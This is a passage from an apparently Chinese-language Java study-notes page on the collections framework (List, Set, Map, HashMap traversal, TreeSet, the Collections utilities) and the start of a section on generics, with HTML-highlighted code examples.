class="hljs-number">1</span>,<span class="hljs-number">4</span>));      <span class="hljs-comment">//[javass2, urm2, rr2]</span><br>   System.<span class="hljs-keyword">out</span>.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm4]</span><br></code></pre></td></tr></table></figure><h2 id="List-遍历"><a href="#List-遍历" class="headerlink" title="List 遍历"></a>List 遍历</h2><ul><li>适用于所有实现子类</li></ul><p>迭代器遍历</p><ul><li><p>Iterator 对象为迭代器，用于遍历 Collection 集合的元素</p></li><li><p>实现 Collection 接口的集合类都有 iterator( ) 方法，返回一个迭代器</p></li><li><p>Iterator 结构</p></li><li><p>Iterator 仅用于遍历集合，Iterator 本身并不存放对象</p></li><li><p>快捷输入 itit</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Iterator iterator=list.iterator();<br>    Object <span class="hljs-keyword">next</span>=iterator.<span class="hljs-keyword">next</span>();<br>    System.out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">next</span>);       <span class="hljs-comment">//javass</span><br>        <br>    Object next2=iterator.<span class="hljs-keyword">next</span>();<br>    System.out.<span class="hljs-keyword">println</span>(next2);          <span class="hljs-comment">//javass2</span><br>        <br>    System.out.<span class="hljs-keyword">println</span>(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm2, urm]</span><br><span class="hljs-comment">//相当于指针</span><br></code></pre></td></tr></table></figure></li></ul><p>增强 for 循环</p><ul><li>实际上还是迭代器遍历</li><li>快捷输入 iter&#x2F;xxx.for</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">Object</span> o : list) &#123;<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(o);<br>&#125;<br>        <br>//javass<br>javass2<br>urm2<br>rr2<br>urm<br>java<br>rr<br>urm2<br>urm<br></code></pre></td></tr></table></figure><p>for 循环</p><ul><li>xxx.for</li><li>前提有索引</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>    System.<span class="hljs-keyword">out</span>.println(list.<span class="hljs-keyword">get</span>(i));<br>&#125;<br><span class="hljs-comment">//有索引</span><br></code></pre></td></tr></table></figure><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><ul><li>由数组实现数据存储</li><li>Vector 和 ArrayList 基本相同，Vector 线程安全，ArrayList 执行效率高</li></ul><p>ArrayList 扩容机制</p><ul><li>有一个 Object 类型的数组 elementData，存放元素 transient Object [ ] elementData</li><li>指定大小构造器</li></ul><h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><ul><li>对象数组存放元素，protected Object [ ]  elementData</li><li>指定扩容个数        new Vector(10,3)</li></ul><h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><ul><li>双向链表，有两个属性 first 和 last 分别指向首节点和尾节点</li><li>每个节点（Node 对象）里面有 prev 、next、item三个属性，item 存放元素，prev 指向前一个节点，next 指向后一个节点</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">   Node java= <span class="hljs-built_in">new</span> Node(&quot;java&quot;);<br>       Node rw=<span class="hljs-built_in">new</span> Node(&quot;rw&quot;);<br>       Node urm=<span class="hljs-built_in">new</span> Node(&quot;urm&quot;);<br>       java.next=rw;<br>       rw.next=urm;<br>       <br>       urm.prev=rw;<br>       rw.prev=java;<br>       <br>       Node first=java;<br>       Node last=urm;<br>       <br>       Node <span class="hljs-keyword">temp</span>=first;<br>       <span class="hljs-keyword">while</span>(<span class="hljs-keyword">temp</span>!=<span class="hljs-keyword">null</span>)&#123;<br>           <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">temp</span>);<br>           <span class="hljs-keyword">temp</span>=<span class="hljs-keyword">temp</span>.next;<br>       &#125;<br>        <br>        <span class="hljs-keyword">temp</span>=last;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">temp</span>!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">temp</span>);<br>            <span class="hljs-keyword">temp</span>=<span class="hljs-keyword">temp</span>.prev;<br>        &#125;<br>    <br>    &#125;<br>   <br>&#125;<br><span class="hljs-keyword">class</span> Node&#123;<br>    <span class="hljs-built_in">public</span> Node prev;<br>    <span class="hljs-built_in">public</span> Node next;<br>    <span class="hljs-built_in">public</span> <span class="hljs-keyword">Object</span> item;<br>    <br>    <span class="hljs-built_in">public</span> Node(<span class="hljs-keyword">Object</span> item) &#123;<br>        this.item = item;<br>    &#125;<br>    <br>    @Override<br>    <span class="hljs-built_in">public</span> String toString() &#123;<br>        <span class="hljs-keyword">return</span> &quot;Node&#123;&quot; +<br>                &quot;item=&quot; + item +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br>//Node&#123;item=java&#125;<br>Node&#123;item=rw&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=rw&#125;<br>Node&#123;item=java&#125;<br></code></pre></td></tr></table></figure><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><ul><li><p>无序，没有索引，但是输出顺序固定</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs csharp">HashSet hashSet=<span class="hljs-keyword">new</span> HashSet();<br>    hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>    hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;abc&quot;</span>);<br>    hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;def&quot;</span>);<br>    hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;javsdv&quot;</span>);<br>    hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;rw&quot;</span>);<br>    System.<span class="hljs-keyword">out</span>.println(hashSet);<br><span class="hljs-comment">//[java, abc, def, rw, javsdv]</span><br></code></pre></td></tr></table></figure></li><li><p>不允许重复元素，最多包含一个 null</p></li><li><p>Set 接口是 Collection 子接口，常用方法和 Collection 一样</p></li><li><p>Set 接口遍历方式</p><ul><li>迭代器遍历</li><li>增强 for 遍历</li><li>不能用索引来获取，无法使用普通 for 遍历</li></ul></li></ul><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><ul><li><p>实际上是 HashMap</p></li><li><p>无序，取决于 hash 后，确定索引结果</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"> HashSet <span class="hljs-keyword">set</span>=<span class="hljs-built_in">new</span> HashSet();<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.<span class="hljs-keyword">add</span>(&quot;java&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.<span class="hljs-keyword">add</span>(&quot;abc&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.<span class="hljs-keyword">add</span>(&quot;def&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.<span class="hljs-keyword">add</span>(&quot;java&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">null</span>));<br>    <span class="hljs-keyword">set</span>.remove(&quot;def&quot;);<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;set&quot;+<span class="hljs-keyword">set</span>);<br>//<span class="hljs-keyword">true</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">set</span>[<span class="hljs-keyword">null</span>, java, abc]<br></code></pre></td></tr></table></figure></li></ul><p><strong>add 进行的操作</strong></p><ul><li>HashMap 底层是（数组 + 链表 + 红黑树）</li><li>添加一个元素时，先得到 hash 值，然后转化为索引值</li><li>找到存储数据表 table ，看这个索引位置是否已经存放元素，没有就直接加入，有就调用 equals 比较，相同就放弃添加，不同就添加到最后</li><li>如果一条链表元素个数&gt;&#x3D;8,table &gt;&#x3D;64，进行树华</li><li>如果链表没达到 8 ，table 没到 64，先进行数组扩容</li><li>加入 HashMap 中的元素，是否相同由 HashCode 和 equals 方法决定</li></ul><h2 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h2><ul><li>不允许添加重复元素，是HashSet子类，底层是 LinkedHashMap</li><li>遍历顺序和添加顺序一致</li><li>存放元素方式和 HashSet 相同，在此基础上又维护了一个双向链表</li></ul><h2 id="Map-接口"><a href="#Map-接口" class="headerlink" title="Map 接口"></a>Map 接口</h2><ul><li>与 Collection 并列存在。用于保存具有映射关系的数据：Key - Value （双列集合）</li><li>key 和 value 可以是任何引用数据类型，会封装到 HashMap$Node 对象中</li><li>key 不能重复，key 一样时，新的值会替换旧的，value可以重复</li><li>key 可以为 null （只能一个），value 可以为 null (可以多个)</li><li>key 和 value 为单向一对一关系，通过指定 key 可以找到对应的 value</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">  Map hashMap=<span class="hljs-built_in">new</span> HashMap();<br>    hashMap.put(&quot;user&quot;,&quot;bb&quot;);<br>    hashMap.put(&quot;pass&quot;,&quot;word&quot;);<br>    <span class="hljs-type">Integer</span> <span class="hljs-type">integer</span>=<span class="hljs-built_in">new</span> <span class="hljs-type">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(<span class="hljs-type">integer</span>,<span class="hljs-keyword">null</span>);<br>        <br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap);<br>//&#123;<span class="hljs-number">100</span>=<span class="hljs-keyword">null</span>, pass=word, <span class="hljs-keyword">user</span>=bb&#125;<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Map hashMap=<span class="hljs-built_in">new</span> HashMap();<br>    hashMap.put(&quot;user&quot;,&quot;bb&quot;);<br>    hashMap.put(&quot;pass&quot;,&quot;word&quot;);<br>    hashMap.put(&quot;admin&quot;,&quot;me&quot;);<br>    <span class="hljs-type">Integer</span> <span class="hljs-type">integer</span>=<span class="hljs-built_in">new</span> <span class="hljs-type">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(<span class="hljs-type">integer</span>,<span class="hljs-keyword">null</span>);<br>    hashMap.remove(&quot;user&quot;);<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap.<span class="hljs-keyword">get</span>(&quot;pass&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap.size());<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap.isEmpty());<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap.containsKey(&quot;admin&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap);<br>//word<br><span class="hljs-number">3</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br>&#123;<span class="hljs-number">100</span>=<span class="hljs-keyword">null</span>, pass=word, <span class="hljs-keyword">admin</span>=me&#125;<br></code></pre></td></tr></table></figure><h2 id="HashMap-遍历"><a href="#HashMap-遍历" class="headerlink" title="HashMap 遍历"></a>HashMap 遍历</h2><ul><li><p>取出所有的 Key ，通过 key 获取 value</p><ul><li><p>加强 for循环</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">Set</span> <span class="hljs-attribute">keyset</span>=hashMap.keySet();<br><span class="hljs-keyword">for</span>(Object key:keyset)&#123;<br>    System.out.println(key+<span class="hljs-string">&quot;-&quot;</span>+hashMap.<span class="hljs-built_in">get</span>(key));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>迭代器遍历</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-type">Iterator</span> <span class="hljs-keyword">iterator</span>=<span class="hljs-type">set</span>.<span class="hljs-keyword">iterator</span>();<br><span class="hljs-keyword">while</span>(<span class="hljs-keyword">iterator</span>.hasNext())&#123;<br><span class="hljs-type">Object</span> keyset=<span class="hljs-keyword">iterator</span>.next();<br><span class="hljs-type">System</span>.<span class="hljs-keyword">out</span>.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"> <span class="hljs-keyword">Set</span> keysset =hashMap.keySet();<br> keysset.<span class="hljs-keyword">forEach</span>(<span class="hljs-built_in">new</span> Consumer() &#123;<br>      @Override<br>      <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> accept(<span class="hljs-keyword">Object</span> keyset) &#123;<br>         <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(keyset+&quot;-&quot;+hashMap.<span class="hljs-keyword">get</span>(keyset));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>取出所有的 value</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Collection <span class="hljs-keyword">values</span>=hashMap.<span class="hljs-keyword">values</span>();<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">Object</span> <span class="hljs-keyword">value</span>:<span class="hljs-keyword">values</span>)&#123;<br>      <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">value</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>通过 EntrySet 来获取 K-V</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">Set entrySet=hashMap.entrySet();<br> <span class="hljs-keyword">for</span> (Object keyset:entrySet)&#123;<br> Map.<span class="hljs-keyword">Entry</span> <span class="hljs-keyword">entry</span>=(Map.<span class="hljs-keyword">Entry</span>)keyset;<br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">entry</span>.getKey()+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-keyword">entry</span>.getValue());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Key-Value 存放</p></li><li><p>keySet 和 values 返回类型</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Set</span> <span class="hljs-keyword">set</span>=map.keySet();<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.getClass());<br>Collection <span class="hljs-keyword">values</span>=map.<span class="hljs-keyword">values</span>();<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">values</span>.getClass());<br></code></pre></td></tr></table></figure></li></ul><h2 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2><ul><li>存放键值对：K-V</li><li>键值不能为 null</li><li>使用方法和 HashMap 差不多一样</li></ul><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><ul><li>继承自 Hashtable 类</li><li>用法和 hashmap 一样，键值不能为 null</li></ul><h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><ul><li><p>如果比较结果器为 0 ，数据不会加入到 TreeSet</p></li><li><p>在构造器中，可以传入一个比较器，指定排序规则</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">TreeSet treeSet=<span class="hljs-built_in">new</span> TreeSet(<span class="hljs-built_in">new</span> Comparator() &#123;<br>       @Override<br>       <span class="hljs-built_in">public</span> <span class="hljs-type">int</span> compare(<span class="hljs-keyword">Object</span> o1, <span class="hljs-keyword">Object</span> o2) &#123;<br>            <span class="hljs-keyword">return</span> ((String)o2).compareTo((String)o1);<br>       &#125;<br>   &#125;);<br>   treeSet.<span class="hljs-keyword">add</span>(&quot;abcd&quot;);<br>   treeSet.<span class="hljs-keyword">add</span>(&quot;abc&quot;);<br>   treeSet.<span class="hljs-keyword">add</span>(&quot;abd&quot;);<br>   treeSet.<span class="hljs-keyword">add</span>(&quot;cbd&quot;);<br>   treeSet.<span class="hljs-keyword">add</span>(&quot;ebd&quot;);<br>        <br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(treeSet);<br>//[ebd, cbd, abd, abcd, abc]        <br></code></pre></td></tr></table></figure></li></ul><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><ul><li>可以传入一个比较器，指定排序规则</li><li>如果比较器返回 0 ，则 key 不会加入到 TreeMap，值会替换</li></ul><h2 id="Collections-工具类"><a href="#Collections-工具类" class="headerlink" title="Collections 工具类"></a>Collections 工具类</h2><ul><li>是一个操作 Set、List 和 Map等集合的工具类，提供一系列静态方法</li></ul><h3 id="排序相关"><a href="#排序相关" class="headerlink" title="排序相关"></a>排序相关</h3><ul><li>reverse ( List ):反转 List 元素的顺序</li><li>shuffle ( List ) : 随机打乱</li><li>sort ( List ) : 按升序排序</li><li>sort (List,Comparator ) : 制定规则进行排序</li><li>swap ( List，int i，int  j ) : 将 i 和 j 处元素进行交换</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">ArrayList <span class="hljs-built_in">array</span>List=new ArrayList();<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">200</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">300</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">500</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">600</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">700</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">800</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">900</span>);<br>    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>List);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>     <br><span class="hljs-comment">//reverse(List):对 List 元素进行反转</span><br>    Collections.reverse(<span class="hljs-built_in">array</span>List);<br>    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>List);      <span class="hljs-comment">//[900, 800, 700, 600, 500, 400, 300, 200, 100]</span><br>        <br><span class="hljs-comment">//shuffle(List):对 List 集合元素进行随机打乱</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>        Collections.shuffle(<span class="hljs-built_in">array</span>List);<br>          System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>List);<br>    &#125;<br>        <br><span class="hljs-comment">//sort(List):按升序排序</span><br>   Collections.sort(<span class="hljs-built_in">array</span>List);<br>      System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>List);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>        <br><span class="hljs-comment">//swap(List,int,int):将指定 List 集合的 i 处元素和 j 处元素交换</span><br>   Collections.swap(<span class="hljs-built_in">array</span>List,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br>      System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>List);      <span class="hljs-comment">//[100, 200, 300, 600, 500, 400, 700, 800, 900]</span><br></code></pre></td></tr></table></figure><h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><ul><li><p>Object max &#x2F; min（Collection &#x2F; Collecton，Comparator）：根据顺序 &#x2F; 指定规则返回最大 &#x2F; 小元素</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">Object <span class="hljs-built_in">max</span>=Collections.<span class="hljs-built_in">max</span>(arrayList);<br><span class="hljs-keyword">System</span>.out.println(<span class="hljs-built_in">max</span>);<br></code></pre></td></tr></table></figure></li><li><p>int frequency ( collection,Object ) :返回指定元素出现个数</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> frequency=Collections.frequency(<span class="hljs-built_in">array</span>List,<span class="hljs-number">500</span>);<br>System.<span class="hljs-keyword">out</span>.println(frequency);<br></code></pre></td></tr></table></figure></li><li><p>void copy （List dest，List src）:将 src 内容复制到 dest 中</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">ArrayList <span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList=<span class="hljs-keyword">new</span> ArrayList(arrayList.size());<br>   <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; arrayList.size(); i++) &#123;<br>      <span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList.add(<span class="hljs-number">0</span>);  <br>   &#125;<br>  Collections.copy(<span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList,arrayList);<br>  System.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList);<br></code></pre></td></tr></table></figure></li><li><p>boolean replaceAll（List list，Object oldVal，Object newVal）：使用新值替换所有旧值</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">Collections.replaceAll(<span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList,<span class="hljs-number">200</span>,<span class="hljs-number">1000</span>);<br>System.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">new</span><span class="hljs-number">_</span>arrayList);<br></code></pre></td></tr></table></figure></li></ul><h3 id="集合的使用和选择"><a href="#集合的使用和选择" class="headerlink" title="集合的使用和选择"></a>集合的使用和选择</h3><p><strong>判断需要存储数据类想</strong></p><ul><li>一组对象</li><li>一组键值对</li></ul><p><strong>一组对象（单列）：Collection 接口</strong></p><ul><li><p>允许重复：List</p><ul><li>增删多：LinkedList （底层是双向链表）</li><li>改查多：ArrayList（底层是 Object 类型的可变数组）</li></ul></li><li><p>不允许重复：Set</p><ul><li>无序：HashSet（底层是 HashMap，数组 + 链表 +红黑树）</li><li>排序：TreeSet</li><li>插入和取出顺序一致：LinkedHashSet（底层是数组 + 双向链表）</li></ul></li></ul><p><strong>一组键值对（双列）：Map 接口</strong></p><ul><li>键无序：HashMap（ 数组 + 链表 + 红黑树 ）</li><li>键排序：TreeMap</li><li>键插入和取出顺序一致：LinkedHashMap</li><li>读取文件：Properties</li></ul><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li><p>public class ArrayList&lt;E&gt;</p><p>………</p><p>&lt;E&gt;的 E 为泛型，随意表示</p></li><li><p>带一个或多个类型参数的类或接口</p></li></ul><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><ul><li>interface List&lt;T&gt;{ }</li><li>class HashMap&lt;K,V&gt;{ }</li><li>T、K、V 代表表示类型</li></ul><h2 id="泛型实例化"><a href="#泛型实例化" class="headerlink" title="泛型实例化"></a>泛型实例化</h2><ul><li>HashMap&lt;String，String&gt;   hashMap &#x3D; new HashMap&lt;&gt;( )；</li><li>Iterator&lt;Map.Entry&lt;String,String&gt;&gt;  iterator &#x3D; entries.iterator( )；</li></ul><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-built_in">HashMap</span> hashMap=<span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>();等价于 <span class="hljs-built_in">HashMap</span>&lt;<span class="hljs-built_in">Object</span>&gt; hashMap=<span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><h3 id="自定义泛型类"><a href="#自定义泛型类" class="headerlink" title="自定义泛型类"></a>自定义泛型类</h3><ul><li>不指定类型默认为 